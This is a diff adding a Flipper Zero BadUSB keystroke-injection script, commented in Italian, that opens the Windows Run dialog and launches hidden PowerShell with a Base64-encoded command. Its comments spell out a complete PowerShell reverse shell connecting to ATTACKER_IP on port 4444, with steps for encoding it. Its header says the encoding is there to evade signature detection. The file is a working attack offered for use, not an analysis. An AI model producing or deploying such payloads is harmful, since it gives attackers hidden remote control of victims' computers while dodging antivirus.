@@ -1,0 +1,44 @@
+REM ============================================================
+REM Title:    PowerShell Encrypted Reverse Shell (Base64)
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Reverse Shell
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~6 secondi
+REM Detect:   Medio - encoded command, meno signature
+REM Desc:     Reverse shell con payload Base64 encoded per
+REM           evitare detection basata su signature.
+REM           Genera il payload con:
+REM           echo -n "IEX(...)" | iconv -t UTF-16LE | base64 -w0
+REM CHANGE:   Sostituire BASE64_PAYLOAD con il tuo encoded payload
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -enc BASE64_PAYLOAD_HERE
+ENTER
+
+REM ============================================================
+REM Per generare il payload Base64:
+REM
+REM 1. Scrivi il tuo script PowerShell in un file (payload.ps1):
+REM    $c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444)
+REM    $s=$c.GetStream()
+REM    [byte[]]$b=0..65535|%{0}
+REM    while(($i=$s.Read($b,0,$b.Length))-ne 0){
+REM        $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
+REM        $r=(iex $d 2>&1|Out-String)
+REM        $r2=$r+'PS '+(pwd).Path+'> '
+REM        $sb=([Text.Encoding]::ASCII).GetBytes($r2)
+REM        $s.Write($sb,0,$sb.Length)
+REM        $s.Flush()
+REM    }
+REM    $c.Close()
+REM
+REM 2. Codifica in Base64 (da Linux):
+REM    cat payload.ps1 | iconv -t UTF-16LE | base64 -w0
+REM
+REM 3. Sostituisci BASE64_PAYLOAD_HERE col risultato
+REM ============================================================
